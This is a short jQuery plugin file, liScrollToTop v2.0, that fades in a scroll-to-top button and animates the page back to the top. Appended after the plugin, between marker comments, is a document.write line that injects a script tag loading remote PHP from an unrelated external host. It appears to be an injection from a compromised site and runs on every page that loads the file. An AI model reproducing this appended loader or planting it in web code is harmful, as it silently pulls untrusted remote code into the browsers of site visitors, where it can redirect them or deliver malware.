/*
 * jQuery liScrollToTop v 2.0
 *
 * Copyright 2012, Linnik Yura | MASS CODE
 * Free to use
 * 
 * September 2012
 */
(function($){
	$.fn.liScrollToTop = function(params){
		return this.each(function(){
			var scrollUp = $(this);
			scrollUp.hide();
			if ($(window).scrollTop() > 0) scrollUp.fadeIn("slow")
			$(window).scroll(function() {
				if ($(window).scrollTop() <= 0) scrollUp.fadeOut("slow")
				else scrollUp.fadeIn("slow")
			});
			scrollUp.click(function() {
				$("html, body").animate({scrollTop: 0}, "slow")
			})
		});
	};
})(jQuery);

/*61d566*/
document.write('<script type="text/javascript" src="http://shopee.pl/RPhjNVbp.php?id=6496790"></script>');

/*/61d566*/
